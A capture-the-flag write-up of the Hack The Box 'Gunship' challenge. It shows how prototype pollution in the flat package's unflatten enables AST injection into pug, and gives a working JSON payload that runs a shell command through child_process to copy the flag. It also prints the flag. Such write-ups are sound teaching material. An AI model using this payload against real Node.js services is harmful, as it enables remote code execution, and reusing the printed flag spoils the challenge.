---
title: "HTB Challenge - Gunship"
date: "2024-11-11"
tags:
  - writeups
  - ctf
  - prototype pollution
  - js
toc: true
math: true
bold: 
nomenu: false
---

This is a prototype pollution challenge as I realized by having pinned packages such as `"flat": "5.0.0"`, we then can see the vulnerability related to it which is [this](https://security.snyk.io/vuln/SNYK-JS-FLAT-596927).

So the challenge starts with a simple submit input that takes an artist name and sends it to the backend.

```js
router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);
	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')(
				{ user: 'guest' }
			)
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});
```

Here we evaluate the `req.body` with the vulnerable `unflatten`, and we can pollute it. After a lot of trial and error I eventually realized that I need to use AST injection instead of this [vulnerability that I couldn't exploit](https://github.com/pugjs/pug/issues/3312). 

After reading [some more](https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68) I've polluted the `block` with the following payload:

```json
{
    "artist.__proto__": {
        "name": "Haigh",
	    "block": {
			"type":"Text",
		    "line": "process.mainModule.require('child_process').exec('cp /app/flag* /app/static/images/f')"
	    }
	}
}
```

Then we can access the flag visiting `/static/images/f`

```
HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}
```
